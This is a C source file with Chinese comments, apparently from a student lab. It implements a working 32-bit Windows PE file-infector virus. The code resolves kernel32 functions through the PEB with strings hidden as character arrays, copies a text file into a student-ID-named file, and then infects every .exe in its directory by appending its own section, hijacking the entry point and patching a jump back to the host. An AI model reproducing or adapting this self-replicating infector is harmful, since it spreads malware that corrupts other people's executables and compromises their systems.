//代码运行在32位程序中
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <tchar.h> 

// 获取kernel32.dll和宿主程序的基址ImageBase
__forceinline void get_imagebase(PVOID* kernel32Base, PVOID* peBase) {
  
    //内联汇编读取当前进程的fs:[30]以获取peb
    PEB *peb;
    asm volatile (
        "movl %%fs:0x30, %0"
        : "=r" (peb)
    );

    PEB_LDR_DATA *ldr = peb->Ldr;
    PLIST_ENTRY moduleList = &(ldr->InMemoryOrderModuleList);

    // 遍历链表并检查每个LDR_DATA_TABLE_ENTRY以找到kernel32.dll和宿主程序的基址
    int flag = 1;
    PLIST_ENTRY currentEntry = moduleList->Flink;
    while (currentEntry != moduleList) {

        // 获取LDR_DATA_TABLE_ENTRY结构，注意InMemoryOrderLinks的偏移是8这里要减去以获得正确的结构
        LDR_DATA_TABLE_ENTRY *module = (LDR_DATA_TABLE_ENTRY *)((PBYTE)currentEntry - 8);
    
        // 获取模块的基址和模块名称，强制指针类型转换得到Buffer
        PVOID ImageBase = module->DllBase;
        UNICODE_STRING* temp = (UNICODE_STRING*)module->Reserved4;
        PWSTR moduleName = temp->Buffer;

        // 判断模块名称是否包含 "kernel32.dll", 避免使用字符串
        WCHAR kernel32[] = {L'K', L'E', L'R', L'N', L'E', L'L', L'3', L'2', L'.', L'D', L'L', L'L', L'\0'};
        int match = 1;
        for (int i = 0; kernel32[i] != L'\0'; i++) {
            if (moduleName[i] != kernel32[i]) {
                match = 0;
                break;
            }
        }
        if (match) {
            // 找到 kernel32.dll，返回其基址
            *kernel32Base = ImageBase;
        }

        if (flag == 1) { // 宿主程序一般在链表头
            *peBase = ImageBase;
            flag = 0;
        }
        // 继续下一个节点
        currentEntry = currentEntry->Flink;
    }
    return;
}


// 获取导出表的RVA
__forceinline DWORD get_ExportTableRVA(PVOID ImageBase) {

    //获取DOS头部信息
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)(ImageBase);
    DWORD e_lfanew = dosHeader->e_lfanew;

    //获取OPTIONAL_HEADER的偏移
    DWORD Offset = e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER);

    // 获取导出表的 RVA
    IMAGE_OPTIONAL_HEADER32* OptionalHeader = (IMAGE_OPTIONAL_HEADER32*)(Offset + ImageBase);
    DWORD exportTableRVA = OptionalHeader->DataDirectory[0].VirtualAddress;
    return exportTableRVA;
}


//找出导出函数总数、Ordinal Base和三个地址表的VA
__forceinline void get_ExportTable_info(PVOID kernel32Base,
    DWORD* Ordinal_Base, DWORD* exportFunctionCount, PDWORD* exportFunctionNameTableVA, 
    PWORD* exportFunctionOrdinalTableVA, PDWORD* exportFunctionAddressTableVA
) {
    //获取导出表VA = kernel32.dll的基址 + 导出表RVA
    DWORD exportTableRVA = get_ExportTableRVA(kernel32Base);
    PVOID exportTableVA = exportTableRVA + kernel32Base;
    
    // 获取导出表的指针
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)(exportTableVA);
    
    // 获取Ordinal Base
    *Ordinal_Base = exportDirectory->Base;

    // 获取导出函数总数
    *exportFunctionCount = exportDirectory->NumberOfFunctions;

    // 获取导出函数名称地址表的VA(4B/each对应PDWORD)
    *exportFunctionNameTableVA = exportDirectory->AddressOfNames + kernel32Base;

    // 获取导出函数序号表的RVA(2B/each对应PWORD)
    *exportFunctionOrdinalTableVA = exportDirectory->AddressOfNameOrdinals + kernel32Base;

    // 获取导出函数地址表的RVA(4B/each对应PDWORD)
    *exportFunctionAddressTableVA = exportDirectory->AddressOfFunctions + kernel32Base;
    return;
}


//找到目标函数的VA
__forceinline PVOID get_targetFunctionVA(
    PVOID kernel32Base, DWORD Ordinal_Base, DWORD exportFunctionCount,
    PDWORD exportFunctionNameTableVA, PWORD exportFunctionOrdinalTableVA, PDWORD exportFunctionAddressTableVA,
    const char* targetFunctionName
) {

    int order = -1;
    // 在名称列表中查找目标函数的名称
    for (int i = 0; i < exportFunctionCount; i++) {
        // 获取导出函数名称地址表中的字符串指针
        PVOID name_pointer = exportFunctionNameTableVA[i] + kernel32Base;
        const char* functionName = (const char*)(name_pointer);

        // 比较字符串是否相同
        int match = 1;
        for (int j = 0; targetFunctionName[j] != '\0'; j++) {
            if (functionName[j] != targetFunctionName[j]) {
                match = 0;
                break;
            }
        }

        if (match) {
            // 使用目标函数名称的序号(Index)查找在序号表中的序号, 注意Index是从1开始的!!!!
            WORD targetFunctionOrdinal = exportFunctionOrdinalTableVA[i+1];

            // 目标函数在导出函数地址表上的序号 n = (N - ordinal base)
            order =  targetFunctionOrdinal - Ordinal_Base;
            break;
        }
    }

    if (order != -1){
        // 使用order查找导出函数地址表中的RVA
        DWORD targetFunctionRVA = exportFunctionAddressTableVA[order];

        //目标函数VA = 基址 + 目标函数RVA
        PVOID targetFunctionVA = kernel32Base + targetFunctionRVA;
        return targetFunctionVA;
    } else {
        return 0;
    }
}


//__attribute__((section(".virus")))用于将代码放在一个段中, 用PE bear抽取得到病毒载荷
void __attribute__((section(".virus"))) ShellCode() {

//--------------------获取病毒要使用的函数-----------------------//
    //定义起始地址, 导出函数总数、Ordinal Base和三个地址表的VA
    PVOID kernel32Base;
    PVOID peBase;
    DWORD Ordinal_Base;
    DWORD exportFunctionCount;
    PDWORD exportFunctionNameTableVA;
    PWORD exportFunctionOrdinalTableVA;
    PDWORD exportFunctionAddressTableVA;

    //获取kernel32和pe的起始地址
    get_imagebase(&kernel32Base, &peBase);
    
    //获取导出函数总数、Ordinal Base和三个地址表的VA信息
    get_ExportTable_info(kernel32Base, &Ordinal_Base, &exportFunctionCount, &exportFunctionNameTableVA, &exportFunctionOrdinalTableVA, &exportFunctionAddressTableVA);

    //定义病毒要用到的函数名称
    const char find_first_file_name[] = {'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', '\0'};
    const char find_next_file_name[] = {'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', '\0'};
    const char find_close_name[] = {'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0'};
    const char create_file_name[] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', '\0'};
    const char read_file_name[] = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};
    const char close_handle_name[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    const char write_file_name[] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0'};
    const char set_file_pointer_name[] = {'S', 'e', 't', 'F', 'i', 'l', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', '\0'};
    
    //找到对应函数的VA
    PVOID FindFirstFileVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, find_first_file_name);
    PVOID FindNextFileVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, find_next_file_name);
    PVOID FindCloseVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, find_close_name);
    PVOID CreateFileAVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, create_file_name);
    PVOID ReadFileVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, read_file_name);
    PVOID CloseHandleVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, close_handle_name);
    PVOID WriteFileVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, write_file_name);
    PVOID SetFilePointerVA = get_targetFunctionVA(kernel32Base, Ordinal_Base, exportFunctionCount, exportFunctionNameTableVA, exportFunctionOrdinalTableVA, exportFunctionAddressTableVA, set_file_pointer_name);

    //声明病毒要使用的函数原型
    typedef HANDLE (__stdcall* FindFirstFileType)(LPCSTR, LPWIN32_FIND_DATAA);
    typedef BOOL(__stdcall* FindNextFileType)(HANDLE, LPWIN32_FIND_DATAA);
    typedef BOOL(__stdcall* FindCloseType)(HANDLE);
    typedef HANDLE (__stdcall* CreateFileAType) (LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL(__stdcall* ReadFileType)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef HANDLE(__stdcall* CloseHandleType)(HANDLE);
    typedef BOOL(__stdcall* WriteFileType)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef DWORD(__stdcall* SetFilePointerType)(HANDLE, LONG, PLONG, DWORD);

    //根据函数VA创建函数指针
    FindFirstFileType find_first_file = (FindFirstFileType)FindFirstFileVA;
    FindNextFileType find_next_file = (FindNextFileType)FindNextFileVA;
    FindCloseType find_close = (FindCloseType)FindCloseVA;
    CreateFileAType create_fileA = (CreateFileAType)CreateFileAVA;
    ReadFileType read_file = (ReadFileType)ReadFileVA;
    CloseHandleType close_handle = (CloseHandleType)CloseHandleVA;
    WriteFileType write_file = (WriteFileType)WriteFileVA;
    SetFilePointerType set_file_pointer = (SetFilePointerType)SetFilePointerVA;

//------------下面开始执行病毒的复制功能, 病毒将某txt中的内容复制到2021302181168.txt-------------//
    //获取当前工作目录路径, 默认为D:/Code/c_code/PE_virus_proc/*
    const char searchPath[] = {'D', ':', '/', 'C', 'o', 'd', 'e', '/', 'c', '_', 'c', 'o', 'd', 'e', '/', 'P', 'E', '_', 'v', 'i', 'r', 'u', 's', '_', 'p', 'r', 'o', 'c', '/', '*', '\0'};
    
    //打开句柄
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = find_first_file(searchPath, &findFileData);
    //循坏读取目录下的文件
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                continue; // 忽略子目录
            }

            // 查找第一个.txt文件
            char txtType[] = {'.', 't', 'x', 't', '\0'};
            int match_txt = 0;
            for (int i = 3; findFileData.cFileName[i] != '\0'; i++) {
                if (findFileData.cFileName[i-3] == txtType[0] && findFileData.cFileName[i-2] == txtType[1] &&
                    findFileData.cFileName[i-1] == txtType[2] && findFileData.cFileName[i] == txtType[3]
                ) {
                    match_txt = 1;
                    break;
                }
            }

            // 找到第一个.txt文件
            if (match_txt) {
                int match_xuehao = 1;
                char xuehao[] = {'2', '0', '2', '1', '3', '0', '2', '1', '8', '1', '1', '6', '8', '.', 't', 'x', 't', '\0'};
                for (int i = 0; findFileData.cFileName[i] != '\0'; i++) {
                    if (findFileData.cFileName[i] != xuehao[i]) {
                        match_xuehao = 0;
                        break; //跳过2021302181168.txt文件
                    }
                }
                if (!match_xuehao) {
                    // 组合dirPath和cFileName得到.txt文件的路径sourceFilePath
                    const char dirPath[] = {'D', ':', '/', 'C', 'o', 'd', 'e', '/', 'c', '_', 'c', 'o', 'd', 'e', '/', 'P', 'E', '_', 'v', 'i', 'r', 'u', 's', '_', 'p', 'r', 'o', 'c', '/', '\0'};
                    char sourceFilePath[100];
                    int index;
                    for (index = 0; dirPath[index] != '\0'; index++) {
                        sourceFilePath[index] = dirPath[index];
                    }
                    for (int j = 0; findFileData.cFileName[j] != '\0'; j++) {
                        sourceFilePath[index] = findFileData.cFileName[j];
                        index++;
                    }
                    sourceFilePath[index] = '\0';

                    // 目标文件路径默认为D:/Code/c_code/PE_virus_proc/2021302181168.txt
                    const char destinationFilePath[] = {'D', ':', '/', 'C', 'o', 'd', 'e', '/', 'c', '_', 'c', 'o', 'd', 'e', '/', 'P', 'E', '_', 'v', 'i', 'r', 'u', 's', '_', 'p', 'r', 'o', 'c', '/', '2', '0', '2', '1', '3', '0', '2', '1', '8', '1', '1', '6', '8', '.', 't', 'x', 't', '\0'};

                    //打开源文件和目标文件
                    HANDLE sourceFile = create_fileA(sourceFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    HANDLE destinationFile = create_fileA(destinationFilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                    //读源文件内容并复制到目标文件中(by byte)
                    DWORD bytesRead;
                    char buffer[1];
                    while (read_file(sourceFile, &buffer, 1, &bytesRead, NULL) && bytesRead > 0) {
                        write_file(destinationFile, &buffer, 1, &bytesRead, NULL);
                    }      
                    close_handle(sourceFile);
                    close_handle(destinationFile);
                    break; // 找到并复制第一个.txt文件后退出
                }
            }
        } while (find_next_file(hFind, &findFileData) != 0); //没找到txt文件则继续遍历目录
    }
    find_close(hFind); //关闭文件夹指针


//--------------下面执行病毒的传染功能, 病毒将自身传染给同目录下的其他exe文件(把infect.cpp搬过来easy)-----------------------//
    //获取当前工作目录路径, 默认为D:/Code/c_code/PE_virus_proc/*
    //const char searchPath[] = {'D', ':', '/', 'C', 'o', 'd', 'e', '/', 'c', '_', 'c', 'o', 'd', 'e', '/', 'P', 'E', '_', 'v', 'i', 'r', 'u', 's', '_', 'p', 'r', 'o', 'c', '/', '*', '\0'};
    //打开句柄
    WIN32_FIND_DATAA findFileData2;
    HANDLE hFind2 = find_first_file(searchPath, &findFileData2);
    //循坏读取目录下的文件
    if (hFind2 != INVALID_HANDLE_VALUE) {
        do {
            if (findFileData2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                continue; // 忽略子目录
            }

            // 查找.exe文件
            char exeType[] = {'.', 'e', 'x', 'e', '\0'};
            int match_exe = 0;
            for (int i = 3; findFileData2.cFileName[i] != '\0'; i++) {
                if (findFileData2.cFileName[i-3] == exeType[0] && findFileData2.cFileName[i-2] == exeType[1] &&
                    findFileData2.cFileName[i-1] == exeType[2] && findFileData2.cFileName[i] == exeType[3]
                ) {
                    match_exe = 1;
                    break;
                }
            }
            
            // 如果找到了
            if (match_exe) {
                //定义待使用的局部变量
                DWORD bytesRead = 0;
                char pe_filepath[100];           //目标文件路径  
                LONG e_lfanew = 0;                   //目标文件的e_lfanew
                IMAGE_DOS_HEADER dosHeader = {0};      //目标文件的dos_Header
                IMAGE_FILE_HEADER fileHeader = {0};    //目标文件的fileHeader
                IMAGE_OPTIONAL_HEADER32 optionalHeader = {0};    //目标文件的optionalHeader
                IMAGE_SECTION_HEADER last_section_header = {0};  //目标文件最后一个节表项
                DWORD AddressOfentryPoint = 0;          //目标文件的原入口地址
                DWORD virus_section_header_place = 0;   //病毒节表项的插入位置
                DWORD virus_PointerToRawData = 0;       //病毒节的PointerToRawData
                DWORD virus_VirtualAddress = 0;         //病毒节的VirtualAddress
                
                LONG self_e_lfanew = 0;                 //自身的e_lfanew
                IMAGE_DOS_HEADER* self_dosHeader = NULL;   //自身的dosHeader地址
                IMAGE_FILE_HEADER* self_fileHeader = NULL; //自身的fileHeader地址
                IMAGE_OPTIONAL_HEADER32* self_optionalHeader = NULL;    //自身的optionalHeader地址
                IMAGE_SECTION_HEADER* self_last_section_header = NULL;  //自身的最后一个节表项地址
                PVOID self_last_section = NULL;                         //自身最后一个节表地址
                DWORD self_last_section_len = 0;                     //自身最后一个节表大小

                // 组合dirPath和cFileName获取exe的文件路径pe_filepath
                const char dirPath[] = {'D', ':', '/', 'C', 'o', 'd', 'e', '/', 'c', '_', 'c', 'o', 'd', 'e', '/', 'P', 'E', '_', 'v', 'i', 'r', 'u', 's', '_', 'p', 'r', 'o', 'c', '/', '\0'};
                int index;
                for (index = 0; dirPath[index] != '\0'; index++) {
                    pe_filepath[index] = dirPath[index];
                }
                for (int j = 0; findFileData2.cFileName[j] != '\0'; j++) {
                    pe_filepath[index] = findFileData2.cFileName[j];
                    index++;
                }
                pe_filepath[index] = '\0';

                //只能以可读的方式打开目标文件，因为有可能出现自己打开自己的情况
                HANDLE peFile = create_fileA(pe_filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                
                //获取目标文件的e_lfanew
                read_file(peFile, &dosHeader, 64, &bytesRead, NULL);
                e_lfanew = dosHeader.e_lfanew;

                //获取目标文件的FILE_HEADER
                set_file_pointer(peFile, e_lfanew + 4, NULL, FILE_BEGIN);
                read_file(peFile, &fileHeader, 20, &bytesRead, NULL);

                //获取病毒节表项的插入位置
                virus_section_header_place = e_lfanew + 4 + 20 + fileHeader.SizeOfOptionalHeader + 40 * (fileHeader.NumberOfSections);

                //获取病毒节的PointerToRawData和VirtualAddress
                DWORD last_section_offset = virus_section_header_place - 40;
                set_file_pointer(peFile, last_section_offset, NULL, FILE_BEGIN);
                read_file(peFile, &last_section_header, 40, &bytesRead, NULL);
                virus_PointerToRawData = last_section_header.PointerToRawData + last_section_header.SizeOfRawData;
                virus_VirtualAddress = last_section_header.VirtualAddress + ((last_section_header.Misc.VirtualSize + 4095) / 4096) * 4096;

                //获取目标文件的原入口地址
                set_file_pointer(peFile, e_lfanew + 4 + 20, NULL, FILE_BEGIN);
                read_file(peFile, &optionalHeader, fileHeader.SizeOfOptionalHeader, &bytesRead, NULL);
                AddressOfentryPoint = optionalHeader.AddressOfEntryPoint;

                //检查目标文件最后一个节表项的名称, 避免重复传染
                BOOL is_infected = TRUE;
                char flag[] = {'.', 'z', 'g', 'd', '\0'};
                for(int i = 0; flag[i] != '\0'; i++) {
                    if (last_section_header.Name[i] != flag[i]){
                        is_infected = FALSE;
                        break;
                    }
                }
                if(is_infected) {
                    continue;
                }

                //重新以可写的方式打开目标文件
                close_handle(peFile);
                HANDLE peFile_again = create_fileA(pe_filepath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                
                //获取自身信息
                self_dosHeader = (IMAGE_DOS_HEADER*)(peBase);
                self_e_lfanew = self_dosHeader->e_lfanew;
                self_fileHeader = (IMAGE_FILE_HEADER*)(peBase + self_e_lfanew + 4);
                self_optionalHeader = (IMAGE_OPTIONAL_HEADER32*)(peBase + self_e_lfanew + 4 + 20);
                int sizeOfoptionalHeader = self_fileHeader->SizeOfOptionalHeader;
                int countOfsections = self_fileHeader->NumberOfSections;
                self_last_section_header = (IMAGE_SECTION_HEADER*)(peBase + self_e_lfanew + 4 + 20 + sizeOfoptionalHeader + (countOfsections - 1)*40);

                //篡改目标文件的入口地址和SizeOfImage
                optionalHeader.AddressOfEntryPoint = virus_VirtualAddress;
                optionalHeader.SizeOfImage = optionalHeader.SizeOfImage + self_last_section_header->Misc.VirtualSize;
                
                set_file_pointer(peFile_again, e_lfanew + 4 + 20, NULL, FILE_BEGIN);
                write_file(peFile_again, &optionalHeader, 224, &bytesRead, NULL);

                //修改目标文件的FileHeader
                fileHeader.NumberOfSections++;
                set_file_pointer(peFile_again, e_lfanew + 4, NULL, FILE_BEGIN);
                write_file(peFile_again, &fileHeader, 20, &bytesRead, NULL);

                //向目标程序插入自己的节表项
                DWORD file_alignment = 512;
                if (((virus_section_header_place % file_alignment) + 40 > file_alignment) || (virus_section_header_place % file_alignment == 0)) {
                    //空间不足则无法插入
                    continue;
                } else {
                    set_file_pointer(peFile_again, virus_section_header_place, NULL, FILE_BEGIN);
                    write_file(peFile_again, self_last_section_header, 40, &bytesRead, NULL);
                }

                //向目标程序插入病毒节(自己读自己)
                self_last_section_len = self_last_section_header->Misc.VirtualSize;
                self_last_section = (PVOID)(peBase + self_last_section_header->VirtualAddress);

                set_file_pointer(peFile_again, virus_PointerToRawData, NULL, FILE_BEGIN);
                write_file(peFile_again, self_last_section, self_last_section_len, &bytesRead, NULL);

                //注意目标程序最后要跳回原执行入口
                //寻找2DFFEEBBAA标志(sub eax, 0x2DFFEEBBAA)
                uint64_t targetValue = 0x2DFFEEBBAA; // 要查找的值(占5个字节)
                PVOID targetPlace;
                uint64_t buffer = 0;
                // 使用循环遍历刚插入的病毒节，查找特定值
                for (size_t i = 0; i <  self_last_section_len - 5; i++) {
                    set_file_pointer(peFile_again, virus_PointerToRawData + i, NULL, FILE_BEGIN);
                    read_file(peFile_again, &buffer, 5, &bytesRead, NULL);
                    if (buffer == targetValue) {
                        //如果找到了，则向后6个字节到add eax,0x14A0处
                        set_file_pointer(peFile_again, virus_PointerToRawData + i + 6, NULL, FILE_BEGIN);
                        //回填原入口地址
                        write_file(peFile_again, &AddressOfentryPoint, 4, &bytesRead, NULL);
                    }
                    buffer = 0;
                }
                close_handle(peFile_again);
            }
        } while (find_next_file(hFind2, &findFileData2) != 0); //没找到exe文件则继续遍历目录
    }
    find_close(hFind2); //关闭文件夹指针


//--------------跳转到宿主程序的原执行入口---------------------//
    asm volatile (
    "movl %0, %%eax\n\t"     // 将peBase加载到EAX
    "addl $0xAABBEEFF, %%eax\n\t"
    "subl $0xAABBEEFF, %%eax\n\t"
    "addl $0x000014A0, %%eax\n\t"   // 保存原执行入口(这里要注意初始状态是0x14A0, 是第一个被嵌入病毒的文件的入口地址)
    "jmp *%%eax"  // 跳转到EAX指向的地址
    :
    : "r" (peBase)
    : "eax"
    );

    return;
}

//gcc -m32 -fno-stack-protector shellcode.c -o shellcode编译生成shellcode.exe(禁用安全选项)
int main(){
    ShellCode();
    return 0;
}
